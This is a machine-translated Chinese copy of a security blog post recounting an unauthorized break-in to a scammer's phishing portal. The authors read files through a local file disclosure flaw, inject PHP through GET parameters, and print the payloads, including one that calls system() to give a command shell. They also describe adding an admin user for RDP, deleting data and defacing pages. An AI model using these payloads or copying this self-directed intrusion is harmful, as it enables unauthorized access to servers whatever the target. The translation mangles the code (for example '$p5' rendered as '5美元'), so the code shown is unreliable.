<html>
<head>
<title>Destroying The Scammers Portal</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">摧毁骗子门户网站</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/destroying-the-scammers-portal-a78b034fb4b2?source=collection_archive---------2-----------------------#2022-11-08">https://infosecwriteups.com/destroying-the-scammers-portal-a78b034fb4b2?source=collection_archive---------2-----------------------#2022-11-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="149d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向所有读者问好，</p><p id="1569" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我们上一个故事<a class="ae kl" href="https://medium.com/@kunwaratulhax0r/hacking-into-scammers-portal-2-d1345e15f014" rel="noopener">入侵骗子门户</a>的继续，我们入侵了骗子门户。</p><p id="422a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">简介</strong></p><p id="701a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如前一篇文章所述，我们的朋友<a class="ae kl" href="https://twitter.com/Sri_Hxor" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> Sri </strong> </a>收到一条关于所得税退税的消息，表明他的所得税计算有误，要获得退税，他应该点击一个链接并安装一个应用程序。</p><p id="b4ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们在网站上做了一些测试，发现了一个“本地文件泄露”漏洞，通过这个漏洞我们可以进入他们的数据库。</p><p id="a56f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们删除了数据库，并放置了一条消息来阻止这一点，但骗子没有停止，并继续通过它来诈骗人们和窃取数据。</p><p id="f25d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">最后一章</strong></p><p id="2d7d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，这次我们想为什么不给这个骗子一个教训呢？</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/af5b8fe6e2ab91b7c53839d378fdc97d.png" data-original-src="https://miro.medium.com/v2/resize:fit:968/format:webp/1*kRNUeI1XkXIoVFrm7aEFxg.png"/></div></figure><p id="753d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们继续测试该应用程序，发现了骗子托管的钓鱼页面。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi ku"><img src="../Images/2d86c199660046fb0775df4fb133c1be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WYOYq3aUwuxZ2GP996BZew.png"/></div></div></figure><p id="82df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">网络钓鱼页面要求受害者提供他们的个人数据以及银行详细信息，包括ATM Pin和网上银行详细信息。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi kz"><img src="../Images/a0c2f94af8b72e7fd884271a258c1124.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m64KwNQ38oDRagFSNM_UoQ.png"/></div></div></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi la"><img src="../Images/73c110598ebddc7e9324e3f80b41ad9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BHi81pdo3wUovmP-mxzApg.png"/></div></div></figure><p id="a0f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些链接被从Refund/xxx.php重定向到某个随机的目录和文件。</p><p id="837c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们通过LFD读取PHP文件，发现它创建了一个随机目录，并复制了钓鱼页面的内容。<br/>一旦受害者输入他们的详细信息，数据将被存储在数据库中，该目录将被删除。</p><p id="c3c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">即使没有输入详细信息，通过比较robo.txt和robo retailed . txt<br/>中的先前时间，文件也会在一段时间后被删除，因此网络钓鱼页面会被临时激活，一旦工作完成，目录会被删除，不会留下网络钓鱼的痕迹。</p><p id="87fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这使得爬虫和检测机制很难检测到该服务器正被用于网络钓鱼攻击。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lb"><img src="../Images/f153be1d2e3100e395e343c0cab8ef06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZmXTQ92VzZUDRmuGORfg0Q.png"/></div></div></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lc"><img src="../Images/69e187bf5410f0bb8d55783d19554c89.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y_R67evGrnN4EzNLvt_ayA.png"/></div></div></figure><p id="d703" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些文件是</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ld"><img src="../Images/ad769359e0ecf5611345cb0c5a1f3b61.png" data-original-src="https://miro.medium.com/v2/resize:fit:904/format:webp/1*hgpD9ngfxHuZHIRtAq0gzA.png"/></div></figure><p id="a53b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Configuration.php文件</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi le"><img src="../Images/3d1bab6e88c0eca2addae1c2873cefcd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-55gFRG0wklPy66Eetmv5A.png"/></div></div></figure><p id="65c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">日志管理文件</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lf"><img src="../Images/334216a5d135149c714b02b3c9a0c6f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2vGw0DEMjWy74_TdcE2rxg.png"/></div></div></figure><p id="f706" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个页面上，骗子管理并检查通过网络钓鱼获取的所有详细信息。</p><p id="760e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在查看了每个文件后，我找到了上传shell的方法。</p><p id="40b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">剥削</strong></p><p id="b7c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">钓鱼PHP脚本有以下几行-</p><blockquote class="lg lh li"><p id="c97e" class="jn jo lj jp b jq jr js jt ju jv jw jx lk jz ka kb ll kd ke kf lm kh ki kj kk ij bi translated">$page = $p1。$p2。$p3。$p4。$pg。5美元。" \ n \ $ owner = ' $ owner"。$ p6<br/>$ file 1 = $ abstrand。"/pg . PHP "；<br/> $fh = fopen($file1，" w ")或die("无法打开文件！");<br/> fwrite($fh，$ page)；<br/>fclose($ FH)；</p><p id="ca1d" class="jn jo lj jp b jq jr js jt ju jv jw jx lk jz ka kb ll kd ke kf lm kh ki kj kk ij bi translated">返回$ result</p></blockquote><p id="be45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们看一下上面的语句，我们就会知道，除了所有的txt文件之外，它还创建了一个PHP文件，其中的内容来自参数$p-$p6。</p><p id="db50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">幸运的是，很少有参数直接从$_GET获取数据。<br/>所以我修改了参数，把phpinfo()放到文件里。</p><blockquote class="lg lh li"><p id="e62b" class="jn jo lj jp b jq jr js jt ju jv jw jx lk jz ka kb ll kd ke kf lm kh ki kj kk ij bi translated">有效载荷—taz’；phpinfo()；$gg= '</p></blockquote><p id="8d72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这用一个PHP文件创建了一个随机目录，在访问它时，我们可以看到PHPINFO页面</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi ln"><img src="../Images/a4c469a80defbf0c966a97a8953e03c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Uzzl8z6HXt_478EGwPy88w.png"/></div></div></figure><p id="4865" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了得到贝壳。</p><p id="e5cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效负载-<strong class="jp ir">' % 3b var _ dump(system(% 24 _ GET[1])% 3b % 24gg = '</strong></p><p id="5f4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lo"><img src="../Images/f09d8fae2916a967262323917527e424.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L_hD6AoVYCXaQfdHlTwbpQ.png"/></div></div></figure><p id="b4d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">xampp以管理员身份运行，因此很容易添加用户并访问RDP。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lp"><img src="../Images/c12d7bd1e13dd021925768f4ebd92978.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9gN5JL9nXaLp0tUWpmmoZw.png"/></div></div></figure><p id="1c70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们做的事情很少。</p><ul class=""><li id="86ae" class="lq lr iq jp b jq jr ju jv jy ls kc lt kg lu kk lv lw lx ly bi translated">删除了所有的钓鱼文件和数据。</li><li id="e46d" class="lq lr iq jp b jq lz ju ma jy mb kc mc kg md kk lv lw lx ly bi translated">已更改管理员背景和索引页面以发送邮件。</li><li id="729e" class="lq lr iq jp b jq lz ju ma jy mb kc mc kg md kk lv lw lx ly bi translated">为执行上述任务创建了计划任务。</li><li id="1a5f" class="lq lr iq jp b jq lz ju ma jy mb kc mc kg md kk lv lw lx ly bi translated">向主机提供商报告了一切。</li><li id="3ef0" class="lq lr iq jp b jq lz ju ma jy mb kc mc kg md kk lv lw lx ly bi translated">卡的详细资料也正在与各自的银行共享，以便他们可以阻止和采取必要的行动。</li></ul><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi me"><img src="../Images/29d13cfd99b6119bdb1119fbf3728325.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LtbkfYjXPxX79hkvgiClJQ.png"/></div></div></figure><p id="71d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">管理员背景</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi mf"><img src="../Images/9e4e0e43fb39a230af9fb1365ed6c053.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xU4KLHKS6FFOy3ERdEqpww.png"/></div></div></figure><p id="1ded" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果任何人打开收到的消息的链接，将会看到我们的消息。</p><p id="9031" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">学分—</p><p id="8a7e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">昆瓦·阿图尔(@昆瓦·阿图尔哈克斯0r)</p><p id="c36c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">animesh Roy(@ anir oy)</p><p id="0f34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Sri Ram (@Sri_Hxor)</p><p id="781a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">沙希瓦特·库马尔(@拉胡拉兹)</p><p id="b4eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">快乐黑客🧑🏻‍💻</p></div><div class="ab cl mg mh hu mi" role="separator"><span class="mj bw bk mk ml mm"/><span class="mj bw bk mk ml mm"/><span class="mj bw bk mk ml"/></div><div class="ij ik il im in"><h2 id="0b9a" class="mn mo iq bd mp mq mr dn ms mt mu dp mv jy mw mx my kc mz na nb kg nc nd ne nf bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kl" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>